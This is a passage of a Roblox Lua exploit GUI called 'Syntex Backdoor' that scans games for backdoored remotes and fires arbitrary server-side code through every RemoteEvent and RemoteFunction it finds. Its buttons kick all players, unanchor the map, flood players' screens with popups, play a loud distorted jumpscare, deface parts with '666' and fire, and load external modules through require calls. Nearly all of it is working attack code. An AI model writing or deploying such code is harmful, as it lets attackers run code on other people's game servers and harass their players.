					local checkDuration = 0
					while checkDuration < 0.5 do
						if workspace:FindFirstChild(NeededNameOfModel) then 
							print('Detected')
							AcquiredRemote = b
							break
						end
						wait(0.1)
						checkDuration = checkDuration + 0.1
					end 
				end 
			end
	
			for _, b in pairs(RemoteList) do
				task.spawn(checkRemote, b)
			end
	
			wait(0.1)
	
			local elapsedTime = os.clock() - startTime
	
			if AcquiredRemote ~= nil then 
				isFound = true 
				ScanButton.Text = 'Statut : Injected'
				Cody.Text = '-- Backdoor Found !'
				StarterGui:SetCore("SendNotification", {
					Title = "Backdoor Found!",
					Text = "Time: " .. string.format("%.2f seconds", elapsedTime)
				})
				
				wait(2)
				Cody.Text = ""
	
				exe.MouseButton1Click:Connect(function()
					local textToSend = Cody.Text
					if AcquiredRemote:IsA('RemoteEvent') then
						AcquiredRemote:FireServer(textToSend)
					elseif AcquiredRemote:IsA('RemoteFunction') then
						AcquiredRemote:InvokeServer(textToSend)
					end
					warn('Syntex Backdoor // Firing Acquired Remote '.. AcquiredRemote.Name .. ' with Code : ' .. textToSend)
					exe.Text = "Executed !"
					wait(1)
					exe.Text = "Execute"
				end)
	
				script.Parent.r6.MouseButton1Click:Connect(function()
					local textToSend = "require(3436957371):r6('".. game.Players.LocalPlayer.Name .. "')"
					if AcquiredRemote:IsA('RemoteEvent') then
						AcquiredRemote:FireServer(textToSend)
					elseif AcquiredRemote:IsA('RemoteFunction') then
						AcquiredRemote:InvokeServer(textToSend)
					end
					warn('Syntex Backdoor // Firing Acquired Remote '.. AcquiredRemote.Name .. ' with Code : ' .. textToSend)
					exe.Text = "Executed !"
					wait(1)
					exe.Text = "Execute"
				end)
			else 
				isFound = false 
				Cody.Text = '-- No backdoor:(' 
				wait(2)
				Cody.Text = ""
				warn('Syntex Backdoor // No backdoor.')
			end 
			IsAcquiring = false 
		end 
	end)
end;
task.spawn(C_24);
-- StarterGui.SyntexHub.SriptHub.DraggableGUI
local function C_28()
local script = G2L["28"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_28);
-- StarterGui.SyntexHub.SriptHub.rainbowGradient
local function C_2a()
local script = G2L["2a"];
	local speed = 3
	while task.wait() do
		local hue = tick() % speed / speed
		local color = Color3.fromHSV(hue, 0.5, 1)
		local hue2 = (tick() + speed/(speed*2.4)) % speed / speed
		local color2 = Color3.fromHSV(hue2, 0.5, 1)
		
		for i,v in ipairs(script.Parent:GetDescendants()) do
			if v:IsA("UIGradient") then
				v.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,color),ColorSequenceKeypoint.new(1,color2)})
			end
		end
	
	end
	
	local exec = script.Parent.Parent.SS
	script.Parent.Position = exec.Position
end;
task.spawn(C_2a);
-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Decal.LocalScript
local function C_32()
local script = G2L["32"];
	local IDTextBox = script.Parent.Parent.Parent.ID -- Reference to the TextBox
	
	script.Parent.MouseButton1Click:Connect(function()
		local ID = IDTextBox.Text -- Get the ID from the TextBox
		print("Button clicked. ID: " .. ID) -- Debugging output
		print("Firing all remotes")
	
		-- Check if the ID is not empty
		if ID == "" then
			print("Error: ID is empty.")
			return
		end
	
		local command = [[
	        local normalIds = {
	            Enum.NormalId.Front,
	            Enum.NormalId.Back,
	            Enum.NormalId.Top,
	            Enum.NormalId.Bottom,
	            Enum.NormalId.Left,
	            Enum.NormalId.Right
	        }
	
	        print("Applying decals to parts...")
	        for _, v in pairs(game.Workspace:GetChildren()) do
	            if v:IsA('Part') then
	                for i = 1, #normalIds do
	                    local decal = Instance.new('Decal')
	                    decal.Texture = 'http://www.roblox.com/asset/?id=]] .. ID .. [['
	                    decal.Parent = v
	                    decal.Face = normalIds[i]
	                end
	            end
	        end
	
	        print("Applying decals to models...")
	        for _, v in pairs(game.Workspace:GetChildren()) do
	            if v:IsA('Model') then
	                for _, z in pairs(v:GetChildren()) do
	                    if z:IsA('Part') then
	                        for i = 1, #normalIds do
	                            local decal = Instance.new('Decal')
	                            decal.Texture = 'http://www.roblox.com/asset/?id=]] .. ID .. [['
	                            decal.Parent = z
	                            decal.Face = normalIds[i]
	                        end
	                    end
	                end
	            end
	        end
	
	        print("Finished applying all changes.")
	    ]]
								
	    for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
			    v:FireServer(command)
		    end 
		end
	end)
end;
task.spawn(C_32);
-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Particles.LocalScript
local function C_36()
local script = G2L["36"];
	local IDTextBox = script.Parent.Parent.Parent.ID
	
	script.Parent.MouseButton1Click:Connect(function()
		local ID = IDTextBox.Text
		print("ID: " .. ID)
		print("Firing all remotes")
	
		if ID == "" then
			print("Error: ID is empty.")
			return
		end
	
		local command = [[
	        local ID = "]] .. ID .. [[" -- Pass the ID to the server
	        for _, player in pairs(game.Players:GetPlayers()) do
	            if player.Character and player.Character:FindFirstChild("Head") then
	                local emit = Instance.new("ParticleEmitter")
	                emit.Parent = player.Character.Head
	                emit.Texture = "http://www.roblox.com/asset/?id=" .. ID
	                emit.VelocitySpread = 100000
	            end
	        end
	    ]]
			
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				v:FireServer(command)
			end 
		end
	end)
end;
task.spawn(C_36);
-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.666.LocalScript
local function C_3a()
local script = G2L["3a"];
	script.Parent.MouseButton1Click:Connect(function()
		print("Firing all remotes")
	
		local command = [[
		for i,v in next,workspace:children''do
			if(v:IsA'BasePart')then
				local me=v;
				local bbg=Instance.new('BillboardGui',me);
				bbg.Name='stuf';
				bbg.Adornee=me;
				bbg.Size=UDim2.new(2.5,0,2.5,0)
				--bbg.StudsOffset=Vector3.new(0,2,0)
				local tlb=Instance.new'TextLabel';
				tlb.Text='666 666 666 666 666 666';
				tlb.Font='SourceSansBold';
				tlb.FontSize='Size48';
				tlb.TextColor3=Color3.new(1,0,0);
				tlb.Size=UDim2.new(1.25,0,1.25,0);
				tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
				tlb.BackgroundTransparency=1;
				tlb.Parent=bbg;
			end;end;
		local function xds(dd)
			for i,v in next,dd:children''do
				if(v:IsA'BasePart')then
					v.BrickColor=BrickColor.new'Really black';
					v.TopSurface='Smooth';
					v.BottomSurface='Smooth';
					local s=Instance.new('SelectionBox',v);
					s.Adornee=v;
					s.Color=BrickColor.new'Really red';
					local a=Instance.new('PointLight',v);
					a.Color=Color3.new(1,0,0);
					a.Range=15;
					a.Brightness=5;
					local f=Instance.new('Fire',v);
					f.Size=19;
					f.Heat=22;
				end;
	
				local dec = 'http://www.roblox.com/asset/?id=19399245';
				local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
				--coroutine.wrap(function()
				--for ,_ in pairs(fac) do
				--local ddec = Instance.new("Decal", v)
				--ddec.Face = 
				--ddec.Texture = dec
				--end end)()
				if #(v:GetChildren())>0 then
					xds(v) 
				end
			end
		end
		xds(game.Workspace)
	    ]]
			
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				v:FireServer(command)
			end 
		end
	end)
end;
task.spawn(C_3a);
-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Hint.LocalScript
local function C_3e()
local script = G2L["3e"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt
		print("Firing all remotes")
	
		local command = [[
		    local h = Instance.new("Hint", game.Workspace)
		    h.Text = ']] .. txt.Text .. [['
		    wait(6)
		    h:Destroy()
	    ]]
			
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				v:FireServer(command)
			end 
		end
	end)
end;
task.spawn(C_3e);
-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Message.LocalScript
local function C_42()
local script = G2L["42"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt
		print("Firing all remotes")
	
		local command = [[
		    local m = Instance.new("Message", game.Workspace)
		    m.Text = ']] .. txt.Text .. [['
		    wait(6)
		    m:Destroy()
	    ]]
			
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				v:FireServer(command)
			end 
		end
	end)
end;
task.spawn(C_42);
-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Disco.LocalScript
local function C_46()
local script = G2L["46"];
	script.Parent.MouseButton1Click:Connect(function()
		print("Firing all remotes")
	
		local command = [[
		    local Lighting = game:GetService("Lighting")
		    local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
	
		    local function zigzag(X) 
			    return math.acos(math.cos(X*math.pi))/math.pi
		    end
	
		    local Counter = 0
	
		    Lighting.TimeOfDay = "12:00"
	
		    while wait(0.1) do 
			    ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
			    Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
			    Counter += 0.01
		    end
	    ]]
			
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				v:FireServer(command)
			end 
		end
	end)
end;
task.spawn(C_46);
-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Skybox.LocalScript
local function C_4a()
local script = G2L["4a"];
	script.Parent.MouseButton1Click:Connect(function()
		local ID = script.Parent.Parent.Parent.ID.Text
		print("Firing all remotes")
	
		local command = [[
	        local ID = "]] .. ID .. [["
	        local Skybox = true
	        if Skybox == true then
	            local sky = Instance.new("Sky")
	            sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
	            sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID
	        end
	    ]]
	
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				local success, err = pcall(function() 
					v:FireServer(command) 
				end)
				if not success then
					warn("Failed to fire remote: " .. v.Name .. " Error: " .. err)
				end
			end 
		end
	end)
end;
task.spawn(C_4a);
-- StarterGui.SyntexHub.SriptHub.ScrollingFrame.Sound.LocalScript
local function C_4e()
local script = G2L["4e"];
	script.Parent.MouseButton1Click:Connect(function()
		local ID = script.Parent.Parent.Parent.ID.Text
		print("Firing all remotes")
	
		local command = [[
		      local tubers93 = Instance.new("Sound")
		      tubers93.Parent = game:GetService("Workspace")
		      tubers93.SoundId = "rbxassetid://]] .. ID .. [["
		      tubers93.Playing = true
		      tubers93.Looped = true
		      tubers93.Pitch = 0.9
		      tubers93.Volume = 10
	    ]]
	
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				local success, err = pcall(function() 
					v:FireServer(command) 
				end)
				if not success then
					warn("Failed to fire remote: " .. v.Name .. " Error: " .. err)
				end
			end 
		end
	end)
end;
task.spawn(C_4e);
-- StarterGui.SyntexHub.SriptHub.ssB.LocalScript
local function C_56()
local script = G2L["56"];
	local sh = script.Parent.Parent.Parent.SriptHub
	local ss = script.Parent.Parent.Parent.SS
	
	script.Parent.MouseButton1Click:Connect(function()
		sh.Visible = false
		ss.Visible = true
	end)
end;
task.spawn(C_56);
-- StarterGui.SyntexHub.SriptHub.p2.LocalScript
local function C_5e()
local script = G2L["5e"];
	local sh = script.Parent.Parent.Parent.SriptHub
	local sh2 = script.Parent.Parent.Parent.sh2
	
	script.Parent.MouseButton1Click:Connect(function()
		sh.Visible = false
		sh2.Visible = true
	end)
end;
task.spawn(C_5e);
-- StarterGui.SyntexHub.sh2.p1.LocalScript
local function C_63()
local script = G2L["63"];
	local sh2 = script.Parent.Parent.Parent.sh2
	local sh = script.Parent.Parent.Parent.SriptHub
	
	script.Parent.MouseButton1Click:Connect(function()
		sh2.Visible = false
		sh.Visible = true
	end)
end;
task.spawn(C_63);
-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedHint.LocalScript
local function C_6d()
local script = G2L["6d"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt.Text
		print("Firing all remotes")
	
		local command = [[
		      local function write(text,object)
			if object:IsA("Hint") == true then
				local count = object:FindFirstChild("Count")
				if count == nil then
					count = Instance.new("NumberValue")
					count.Parent = object
					count.Name = "Count"
					count.Value = count.Value + 1
				else
					count.Value = count.Value + 1
				end
				local startcount = count.Value
				for i = 1,#text do
					if count.Value == startcount then
						local letter = string.sub(text,i,i)
						object.Text = string.sub(text,1,i)
						wait(0.001)
					else
						break
					end
				end
			end
		end
		local bro = Instance.new("Hint",workspace)
		write("]] .. txt .. [[",bro)
		wait(6)
		bro:Destroy()
	    ]]
	
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				local success, err = pcall(function() 
					v:FireServer(command) 
				end)
				if not success then
					warn("Failed to fire remote: " .. v.Name .. " Error: " .. err)
				end
			end 
		end
	end)
end;
task.spawn(C_6d);
-- StarterGui.SyntexHub.sh2.ScrollingFrame.AnimatedMessage.LocalScript
local function C_71()
local script = G2L["71"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt.Text
		print("Firing all remotes")
	
		local command = [[
		      local function write(text,object)
			if object:IsA("Message") == true then
				local count = object:FindFirstChild("Count")
				if count == nil then
					count = Instance.new("NumberValue")
					count.Parent = object
					count.Name = "Count"
					count.Value = count.Value + 1
				else
					count.Value = count.Value + 1
				end
				local startcount = count.Value
				for i = 1,#text do
					if count.Value == startcount then
						local letter = string.sub(text,i,i)
						object.Text = string.sub(text,1,i)
						wait(0.001)
					else
						break
					end
				end
			end
		end
		local broM = Instance.new("Message",workspace)
		write("]] .. txt .. [[",broM)
		wait(6)
		broM:Destroy()
	    ]]
	
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				local success, err = pcall(function() 
					v:FireServer(command) 
				end)
				if not success then
					warn("Failed to fire remote: " .. v.Name .. " Error: " .. err)
				end
			end 
		end
	end)
end;
task.spawn(C_71);
-- StarterGui.SyntexHub.sh2.ScrollingFrame.UnAnchor.LocalScript
local function C_75()
local script = G2L["75"];
	script.Parent.MouseButton1Click:Connect(function()
		print("Firing all remotes")
	
		local command = [[
		for i,v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then	
				v.Anchored = false
			end
		end
	
	
		for i,v in pairs(game.ReplicatedStorage:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
	
	
		for i,v in pairs(game.ReplicatedFirst:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
	    ]]
			
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				v:FireServer(command)
			end 
		end
	end)
end;
task.spawn(C_75);
-- StarterGui.SyntexHub.sh2.ScrollingFrame.popups.LocalScript
local function C_79()
local script = G2L["79"];
	script.Parent.MouseButton1Click:Connect(function()
		local ID = script.Parent.Parent.Parent.ID
		print("Firing all remotes")
	
		local command = [[
		    for i,v in pairs(game.Players:GetPlayers()) do
			while true do
				wait(0.4)
				local kill = Instance.new("ScreenGui",v.PlayerGui)
				local kill2 = Instance.new("ImageLabel",kill)
				kill2.Size = UDim2.new(0,491,0,372)
				kill2.Position = UDim2.new(0,math.random(1,1000),0,math.random(1,1000))
				kill2.Image = "http://www.roblox.com/asset/?id=]].. ID .. [["
			end
		end
	    ]]
			
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				v:FireServer(command)
			end 
		end
	end)
end;
task.spawn(C_79);
-- StarterGui.SyntexHub.sh2.ScrollingFrame.Jumpscare.LocalScript
local function C_7d()
local script = G2L["7d"];
	script.Parent.MouseButton1Click:Connect(function()
		local ID = script.Parent.Parent.Parent.ID
		print("Firing all remotes")
	
		local command = [[
		    for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= k and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
				spawn(function()
					local gui = Instance.new("ScreenGui",v.PlayerGui)
					local funny = Instance.new("ImageLabel",gui)
					funny.Image = "rbxassetid://16556565973"
					funny.Size = UDim2.new(1,0,1,0)
					funny.ImageColor3 = Color3.new(255, 255, 255)
					local s = Instance.new("Sound",gui)
					s.SoundId = "rbxassetid://]] .. ID .. [["
					s.Volume = 99999999999999999
					s.Pitch = 1
					s:Play()
					local yes = Instance.new("DistortionSoundEffect",s)
					yes.Level = 0.5
					yes.Priority = 0
					wait(4)
					gui:Destroy()
				end)
			end
		end
	    ]]
			
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				v:FireServer(command)
			end 
		end
	end)
end;
task.spawn(C_7d);
-- StarterGui.SyntexHub.sh2.ScrollingFrame.JohnDoe.LocalScript
local function C_81()
local script = G2L["81"];
	script.Parent.MouseButton1Click:Connect(function()
		print("Firing all remotes")
	
		local command = [[
	        require(2845929020).ooga("]] .. game.Players.LocalPlayer.Name .. [[")
	    ]]
	
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				v:FireServer(command)
			end 
		end
	end)
end;
task.spawn(C_81);
-- StarterGui.SyntexHub.sh2.ScrollingFrame.Shutdown.LocalScript
local function C_85()
local script = G2L["85"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt.Text
		print("Firing all remotes")
	
		local command = [[
	    for i,v in pairs(game.Players:GetPlayers()) do
			v:Kick("]] .. txt .. [[")
		end
	    ]]
	
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				local success, err = pcall(function() 
					v:FireServer(command) 
				end)
				if not success then
					warn("Failed to fire remote: " .. v.Name .. " Error: " .. err)
				end
			end 
		end
	end)
end;
task.spawn(C_85);
-- StarterGui.SyntexHub.sh2.ScrollingFrame.RandomC.LocalScript
local function C_89()
local script = G2L["89"];
	script.Parent.MouseButton1Click:Connect(function()
		print("Firing all remotes")
	
		local command = [[
		      for i,fee in pairs(workspace:GetDescendants()) do
			    if fee:IsA("BasePart") then
				   fee.BrickColor = BrickColor.random()
			    end
		      end
	    ]]
	
		for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do 
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				print("Firing command to: " .. v.Name)
				local success, err = pcall(function() 
					v:FireServer(command) 
				end)
				if not success then
					warn("Failed to fire remote: " .. v.Name .. " Error: " .. err)
				end
			end 
		end
	end)
end;
task.spawn(C_89);
-- StarterGui.SyntexHub.sh2.rainbowGradient
local function C_93()
local script = G2L["93"];
	local speed = 3
	while task.wait() do
		local hue = tick() % speed / speed
		local color = Color3.fromHSV(hue, 0.5, 1)
		local hue2 = (tick() + speed/(speed*2.4)) % speed / speed
		local color2 = Color3.fromHSV(hue2, 0.5, 1)
		
		for i,v in ipairs(script.Parent:GetDescendants()) do
			if v:IsA("UIGradient") then
				v.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,color),ColorSequenceKeypoint.new(1,color2)})
			end
		end
	
	end
	
	local before = script.Parent.Parent.SriptHub
	script.Parent.Position = before.Position
end;
task.spawn(C_93);
-- StarterGui.SyntexHub.sh2.DraggableGUI
local function C_94()
local script = G2L["94"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_94);

return G2L["1"], require;
